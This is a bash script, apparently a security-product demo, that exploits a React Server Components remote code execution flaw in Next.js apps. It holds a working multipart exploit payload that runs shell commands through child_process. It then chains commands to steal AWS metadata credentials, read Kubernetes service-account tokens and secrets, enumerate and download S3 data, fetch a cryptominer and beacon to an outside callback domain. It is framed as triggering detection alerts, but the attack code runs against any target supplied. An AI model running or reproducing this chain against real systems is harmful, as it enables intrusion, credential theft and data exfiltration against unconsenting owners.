#!/bin/bash
#
# Wiz Demo v2 - Streamlined Attack Script
# CVE-2025-66478 React Server Components RCE
# Focused on React2Shell + K8s Lateral Movement
#

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Interactive input if no arguments provided
if [ -z "$1" ]; then
    echo -e "${CYAN}Wiz Demo v2 - Target Configuration${NC}"
    echo ""
    read -p "Enter target host [localhost]: " INPUT_TARGET
    TARGET="${INPUT_TARGET:-localhost}"
    read -p "Enter target port [80]: " INPUT_PORT
    PORT="${INPUT_PORT:-80}"
    echo ""
else
    TARGET="$1"
    PORT="${2:-80}"
fi

SLEEP_TIME=2
PAYLOAD_FILE="/tmp/exploit-payload-$$.bin"
TOTAL_ATTACKS=9

# Banner
echo -e "${RED}"
cat << 'EOF'
 ____                 _   ____  ____  _          _ _
|  _ \ ___  __ _  ___| |_|___ \/ ___|| |__   ___| | |
| |_) / _ \/ _` |/ __| __| __) \___ \| '_ \ / _ \ | |
|  _ <  __/ (_| | (__| |_ / __/ ___) | | | |  __/ | |
|_| \_\___|\__,_|\___|\__|_____|____/|_| |_|\___|_|_|

EOF
echo -e "${NC}"
echo -e "${WHITE}CVE-2025-66478 - React Server Components RCE${NC}"
echo -e "${YELLOW}React2Shell + K8s Lateral Movement Demo${NC}"
echo ""
echo -e "${CYAN}Target:${NC} http://${TARGET}:${PORT}"
echo -e "${CYAN}Attacks:${NC} ${TOTAL_ATTACKS} focused attack patterns"
echo ""
echo -e "${PURPLE}═══════════════════════════════════════════════════════════════${NC}"
echo ""

# Payload delivery function (CVE-2025-66478 exploit)
send_payload() {
    local cmd="$1"

    python3 -c "
import sys
payload = '''------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r
Content-Disposition: form-data; name=\"0\"\r
\r
{\"then\":\"\$1:__proto__:then\",\"status\":\"resolved_model\",\"reason\":-1,\"value\":\"{\\\\\"then\\\\\":\\\\\"\$B1337\\\\\"}\",\"_response\":{\"_prefix\":\"process.mainModule.require('child_process').execSync('$cmd');\",\"_chunks\":\"\$Q2\",\"_formData\":{\"get\":\"\$1:constructor:constructor\"}}}\r
------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r
Content-Disposition: form-data; name=\"1\"\r
\r
\"\$@0\"\r
------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r
Content-Disposition: form-data; name=\"2\"\r
\r
[]\r
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--\r
'''
sys.stdout.buffer.write(payload.replace('\\\\r\\\\n', '\r\n').encode())
" > "$PAYLOAD_FILE"

    curl -s -X POST "http://${TARGET}:${PORT}" \
        -H "Next-Action: x" \
        -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad" \
        --data-binary @"$PAYLOAD_FILE" \
        --connect-timeout 3 -m 5 > /dev/null 2>&1 || true
    rm -f "$PAYLOAD_FILE" 2>/dev/null || true
}

# Attack display function
run_attack() {
    local num="$1"
    local icon="$2"
    local name="$3"
    local desc="$4"
    local wiz_alert="$5"
    local cmd="$6"

    echo -e "${YELLOW}[${num}/${TOTAL_ATTACKS}]${NC} ${icon} ${WHITE}${name}${NC}"
    echo -e "    ${BLUE}→${NC} ${desc}"
    echo -e "    ${GREEN}⚡ Wiz:${NC} ${wiz_alert}"
    echo ""
    send_payload "$cmd"
    echo -e "    ${GREEN}✓${NC} Executed"
    echo ""
    echo -e "${BLUE}───────────────────────────────────────────────────────────────${NC}"
    echo ""
    sleep $SLEEP_TIME
}

# ═══════════════════════════════════════════════════════════════
# PHASE 1: Initial Access (React2Shell)
# ═══════════════════════════════════════════════════════════════

echo -e "${PURPLE}▶ PHASE 1: Initial Access (React2Shell)${NC}"
echo ""

run_attack "1" "💥" "Remote Code Execution + Recon" \
    "Exploits CVE-2025-66478, runs whoami/id/uname (matches Wiz IOCs)" \
    "Execution from Next.js + Suspicious Command" \
    'whoami > /tmp/pwned.txt && id >> /tmp/pwned.txt && uname -a >> /tmp/pwned.txt && echo PWNED >> /tmp/pwned.txt'

# ═══════════════════════════════════════════════════════════════
# PHASE 2: Cloud Credential Theft (IMDS)
# ═══════════════════════════════════════════════════════════════

echo -e "${PURPLE}▶ PHASE 2: Cloud Credential Theft${NC}"
echo ""

run_attack "2" "☁️" "IMDS Role Discovery" \
    "Queries AWS metadata service to find IAM role" \
    "Cloud Metadata Service Access" \
    'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ > /tmp/imds-role.txt'

run_attack "3" "🔑" "AWS Credential Theft" \
    "Extracts temporary AWS credentials from IMDS" \
    "Cloud Credential Theft" \
    'ROLE=$(cat /tmp/imds-role.txt); curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE > /tmp/aws-creds.json'

# ═══════════════════════════════════════════════════════════════
# PHASE 3: Kubernetes Lateral Movement
# ═══════════════════════════════════════════════════════════════

echo -e "${PURPLE}▶ PHASE 3: Kubernetes Lateral Movement${NC}"
echo ""

run_attack "4" "🎫" "K8s Service Account Token Theft" \
    "Reads mounted service account token for K8s API access" \
    "Sensitive File Access" \
    'cat /var/run/secrets/kubernetes.io/serviceaccount/token > /tmp/k8s-token.txt 2>/dev/null || echo "NO_TOKEN_MOUNTED" > /tmp/k8s-token.txt'

run_attack "5" "🔍" "K8s API Secrets Enumeration" \
    "Uses stolen token to list secrets via K8s API" \
    "Cloud API Enumeration" \
    'TOKEN=$(cat /tmp/k8s-token.txt 2>/dev/null); curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/secrets > /tmp/k8s-secrets.json 2>/dev/null || echo "K8S_API_ATTEMPTED" > /tmp/k8s-secrets.json'

# ═══════════════════════════════════════════════════════════════
# PHASE 4: Cloud Lateral Movement (AWS)
# ═══════════════════════════════════════════════════════════════

echo -e "${PURPLE}▶ PHASE 4: Cloud Lateral Movement${NC}"
echo ""

run_attack "6" "🪣" "S3 Bucket Discovery" \
    "Uses stolen AWS creds to enumerate S3 buckets" \
    "Cloud API Enumeration" \
    'aws s3 ls > /tmp/s3-buckets.txt 2>&1'

run_attack "7" "📤" "S3 Data Exfiltration" \
    "Downloads sensitive data from S3" \
    "Data Exfiltration" \
    'aws s3 cp s3://wiz-demo-sensitive-data-wiz-e624d66e/pii/employees.json /tmp/exfil-pii.json 2>&1 || echo "S3_EXFIL_ATTEMPTED" > /tmp/exfil-pii.json'

# ═══════════════════════════════════════════════════════════════
# PHASE 5: Persistence & C2
# ═══════════════════════════════════════════════════════════════

echo -e "${PURPLE}▶ PHASE 5: Persistence & C2${NC}"
echo ""

run_attack "8" "⛏️" "Cryptominer Download" \
    "Attempts to download XMRig (matches real campaigns)" \
    "Cryptominer Activity" \
    'curl -s -o /tmp/xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz --connect-timeout 3 2>/dev/null || echo "MINER_DOWNLOAD_ATTEMPTED" > /tmp/xmrig-marker.txt'

run_attack "9" "📡" "OAST Beacon (C2 Callback)" \
    "Exfiltrates data via OAST domain (triggers Wiz React2Shell detection)" \
    "OAST Detection - React2Shell Indicator" \
    'curl -s "http://react2shell-demo.oastify.com/exfil?pwned=true" --connect-timeout 3 2>/dev/null || curl -s "http://react2shell-demo.oast.live/exfil" --connect-timeout 3 2>/dev/null || echo "OAST_BEACON_SENT" > /tmp/oast-marker.txt'

# ═══════════════════════════════════════════════════════════════
# Summary
# ═══════════════════════════════════════════════════════════════

echo -e "${PURPLE}═══════════════════════════════════════════════════════════════${NC}"
echo ""
echo -e "${RED}    ╔═══════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}    ║         REACT2SHELL ATTACK COMPLETE                   ║${NC}"
echo -e "${RED}    ╚═══════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${WHITE}Attack Chain Summary:${NC}"
echo ""
echo -e "    ${CYAN}Internet${NC} → ${YELLOW}Next.js App${NC} → ${RED}RCE${NC} → ${PURPLE}IMDS${NC} → ${GREEN}AWS Creds${NC} → ${BLUE}S3 Data${NC}"
echo -e "                              ↓"
echo -e "                         ${PURPLE}K8s Token${NC} → ${GREEN}K8s API${NC} → ${BLUE}Secrets${NC}"
echo ""
echo -e "${WHITE}Expected Wiz Defend Alerts:${NC}"
echo ""
echo -e "    ${GREEN}✓${NC} Execution from Next.js (CVE-2025-66478)"
echo -e "    ${GREEN}✓${NC} Cloud Metadata Service Access"
echo -e "    ${GREEN}✓${NC} Cloud Credential Theft"
echo -e "    ${GREEN}✓${NC} Sensitive File Access (K8s token)"
echo -e "    ${GREEN}✓${NC} Cloud API Enumeration (K8s + S3)"
echo -e "    ${GREEN}✓${NC} Data Exfiltration"
echo -e "    ${GREEN}✓${NC} Cryptominer Activity"
echo -e "    ${GREEN}✓${NC} ${YELLOW}OAST Detection${NC} (React2Shell specific!)"
echo ""
echo -e "${CYAN}Artifacts on target:${NC}"
echo -e "    /tmp/pwned.txt       - RCE proof (whoami, id, uname)"
echo -e "    /tmp/aws-creds.json  - Stolen AWS credentials"
echo -e "    /tmp/k8s-token.txt   - K8s service account token"
echo -e "    /tmp/k8s-secrets.json- K8s secrets enumeration"
echo -e "    /tmp/s3-buckets.txt  - S3 bucket listing"
echo -e "    /tmp/exfil-pii.json  - Exfiltrated data"
echo ""
echo -e "${YELLOW}📊 Check Wiz Defend → Threats for the attack timeline${NC}"
echo ""
echo -e "${PURPLE}═══════════════════════════════════════════════════════════════${NC}"
